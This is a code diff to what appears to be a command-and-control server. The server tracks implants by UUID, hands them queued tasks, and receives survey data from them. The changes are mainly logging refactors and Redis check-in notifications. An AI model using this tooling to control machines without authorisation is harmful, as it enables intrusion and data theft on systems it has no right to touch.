@@ -29,6 +29,7 @@ import ast
 import base64
 import threading
 import argparse
+import json
 from datetime import datetime
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import MySQLdb
@@ -76,10 +77,18 @@ def writeLog(log_type, log_text, implant_name, UUID):
         connection.commit()
     redis_client.publish('log_channel', 'new_log')
 
+#Publish CheckIn Messages
+#Current types are taskDelivered, dataReceived
+def publishCheckIn(UUID, type, message):
+    msg = {
+    'uuid': UUID,
+    'type': type,
+    'message': message
+}
+    redis_client.publish('checkin_channel', json.dumps(msg))
 
-
-
-
+def getLogTime():
+    return datetime.now().strftime("%m/%d/%Y %H:%M:%S")
 
 #####controls whether GET will be answered.  Is OFF except for 5 seconds after auth
 def unset_should_get():
@@ -156,7 +165,7 @@ class HandleRequests(BaseHTTPRequestHandler):
             IP = self.client_address[0]
         except:
             IP = self.client_address[0]
-            date_time = datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+            date_time = getLogTime()
             writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
             print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
             return 0
@@ -176,7 +185,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                     verify_key=results[0][0]
                     if verify_key==key:
                         self.wfile.write("write-host Connection Validated".encode("utf-8"))
-                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        date_time=getLogTime()
                         print(f"{green}{date_time}[+]VALIDATE:::Incomming Validation from {IP}:::Server Connect Success{default}")
                         writeLog("Success", f"Server validation success from IP: {IP}", "NULL","NULL")
                         #connection.close()
@@ -186,7 +195,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                         writeLog("Error", f"Server validation failed from IP: {IP} - Invalid Key", "NULL","NULL")
                         return 0
                 except:
-                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                    date_time=getLogTime()
                     print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
                     writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                     return 0
@@ -197,7 +206,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                 request=new_obj["event"]
             except:
                 IP = self.client_address[0]
-                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                date_time=getLogTime()
                 print(f"{yellow}{date_time}[*]Request from IP: {IP} :::Malformed Request{default}")
                 writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                 return 0
@@ -208,7 +217,7 @@ class HandleRequests(BaseHTTPRequestHandler):
             cursor.execute(query)
             results=cursor.fetchall()
             if (len(results)<1):  #if it doesn't exist write implant not found and return
-                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                date_time=getLogTime()
                 print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::IMPLANT NOT FOUND"+default)
                 writeLog("Error", f"Request from unknown UUID: {UUID} at IP: {IP}", "name",UUID)
                 #connection.close()
@@ -232,11 +241,12 @@ class HandleRequests(BaseHTTPRequestHandler):
                     results=cursor.fetchall() ###results are the tasks from the DB
                     
                     if (len(results) > 0):#if tasks are greater than none
-                        date_time=datetime.now().strftime("%d_%m_%Y_%H%M%S")
+                        date_time=getLogTime()
                         num_tasks=len(results)
                         task_word = "Task" if num_tasks == 1 else "Tasks"
                         print(green+date_time+"[+]Incomming Request from " + implant_name + " at IP: " + IP + " :::" + str(num_tasks) + " " + task_word + " delivered"+default)
                         writeLog("Success", f"Check-in from {implant_name} at IP: {IP} - {num_tasks} {task_word} delivered", implant_name,UUID)
+                        publishCheckIn(UUID, "taskDelivered", f'{implant_name} Checked in -- {num_tasks} {task_word} delivered')
                         send_task=''
                         
                         for result in results:
@@ -249,10 +259,10 @@ class HandleRequests(BaseHTTPRequestHandler):
                         #connection.close()
                         return 0
                     else: #if no tasks
-                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        date_time=datetime.now().strftime("%m/%d/%Y %H:%M:%S")
                         print(f"{date_time}[-]Incomming Request from {implant_name} at IP: {IP} :::No Tasking Available")
                         writeLog("Log", f"Check-in from {implant_name} at IP: {IP} - No tasks available", implant_name,UUID)
-                        redis_client.publish('checkin_channel', UUID)
+                        publishCheckIn(UUID, "checkin", f'{date_time} -- Check-in from {implant_name} at IP: {IP} - No pending tasks')
                         #connection.close()
                         return 0  #end of if for requests
                 elif (request=="send"): #post data to server
@@ -265,13 +275,14 @@ class HandleRequests(BaseHTTPRequestHandler):
                         cursor.execute(query)
                         query="commit"
                         cursor.execute(query)
-                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        date_time=getLogTime()
                         print(purple+date_time+"[+]Incomming Data Stream from " + new_obj["UUID"] + " at IP: " + IP + " :::"+default)
                         writeLog("Data", f"Data received from {implant_name} at IP: {IP}", implant_name,UUID)
+                        publishCheckIn(UUID, "dataReceived", f'Survey data received from IP: {IP}')
                         #connection.close()
                         return 0
                     except:
-                        date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                        date_time=getLogTime()
                         print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                         writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                         #connection.close()
@@ -279,7 +290,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                         
 
                 else: #request type is bad
-                    date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                    date_time=getLogTime()
                     print(yellow+date_time+"[*]Request from IP: " + IP + " :::Malformed Request"+default)
                     writeLog("Warning", f"Malformed request from IP: {IP}", "NULL","NULL")
                     #connection.close()
@@ -287,7 +298,7 @@ class HandleRequests(BaseHTTPRequestHandler):
                     
 
             else: ###if key doesnt match
-                date_time=datetime.now().strftime("%d_%m_%Y_%H:%M:%S")
+                date_time=getLogTime()
                 print(red+date_time+"[*]Request from " + UUID + " at IP: " + IP + " :::INVALID KEY"+default)
                 writeLog("Error", f"Request from {implant_name} at IP: {IP} - Invalid Key", implant_name,UUID)
                 #connection.close()
@@ -329,4 +340,4 @@ if __name__ == "__main__":
         except KeyboardInterrupt:
             print("\n[*]Shutting down server")
             stop_threads=True
-    
+
